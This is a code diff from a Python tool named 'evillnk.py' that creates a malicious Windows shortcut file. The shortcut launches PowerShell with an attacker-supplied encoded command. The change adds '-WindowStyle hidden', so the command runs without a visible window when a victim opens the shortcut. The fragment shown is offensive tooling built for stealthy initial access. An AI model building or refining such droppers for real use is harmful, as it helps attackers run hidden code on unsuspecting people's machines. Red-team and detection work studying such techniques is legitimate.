@@ -76,7 +76,7 @@ def write_lnk(lnk):
 def parse_arguments():
     parser = argparse.ArgumentParser(prog='evillnk.py', description='Create an evil lnk that executes PowerShell with arguments')
     parser.add_argument('-n', '--name', required=True, action='store', help='Name of the shortcut file')
-    parser.add_argument('-c', '--command', required=True, action='store', dest='command', help='Encoded command to execute with PowerShell. Will be executed as: powershell -noni -noe -e <command>')
+    parser.add_argument('-c', '--command', required=True, action='store', dest='command', help='Encoded command to execute with PowerShell. Will be executed as: powershell -noni -noe -WindowStyle hidden -e <command>')
     parser.add_argument('--icon', action='store', dest='icon', help='Icon file containing icon for the lnk file')
     parser.add_argument('--index', action='store', type=int, dest='index', help='Index within icon file')
     args = parser.parse_args()
@@ -86,7 +86,7 @@ def main():
     
     args = parse_arguments()
     target = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
-    arguments = '-noni -noe -e ' + args.command
+    arguments = '-noni -noe -WindowStyle hidden -e ' + args.command
     create_lnk(args.name, target, arguments, args.icon, args.index)
 
 
